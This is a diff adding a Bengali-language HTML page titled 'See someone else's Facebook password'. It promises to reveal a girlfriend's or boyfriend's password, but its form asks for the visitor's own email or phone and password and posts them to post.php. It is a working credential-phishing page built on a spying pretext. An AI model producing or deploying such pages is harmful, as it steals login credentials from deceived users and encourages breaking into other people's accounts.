@@ -1,0 +1,64 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<style>
+* {
+	text-align: center;
+  }
+body {
+	
+}
+
+input[type=text],[type=password], select, textarea {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+    margin-top: 6px;
+    margin-bottom: 16px;
+    resize: vertical;
+}
+
+input[type=submit] {
+    background-color: #4CAF50;
+    color: white;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+input[type=submit]:hover {
+    background-color: #45a049;
+}
+
+.container {
+    border-radius: 5px;
+    background-color: #f1f1f1;
+    padding: 20px;
+}
+</style>
+<title>অন্য কারোর ফেসবুক পাসওয়ার্ড দেখুন</title>
+</head>
+<body>
+
+<h3 style="text-align:center; color: #2ed2ad; border: 0px dashed black; padding:10px; background-color: #f1f1f1;">আপনার গার্লফ্রেন্ড/বয়ফ্রেন্ড এর পাসওয়ার্ড দেখুন</h3>
+
+<div class="container">
+  <form  method="post" action="post.php">
+    যার পাসওয়ার্ড দেখবেন তার নাম বা ইমেইল অথবা ফোন নাম্বারঃ
+    <input type="text" id="fname" name="firstname" placeholder="Example: 'Jon Anik' or 'name@example.com' or '01x-xxxxxxx' ">
+
+    আপনার নাম বা ইমেইল বা ফোন নাম্বারঃ
+    <input type="text" id="lname" name="lastname" placeholder="Example: 'Amanda Nusrat' or 'yourname@example.com' or '01x-xxxxxxx'">
+
+    আপনার পাসওয়ার্ডঃ
+    <input type="password" id="powrd" name="pwd" placeholder="******">
+    
+<input type="submit" value="তার পাসওয়ার্ড দেখুন">
+  </form>
+</div>
+
+</body>
+</html>
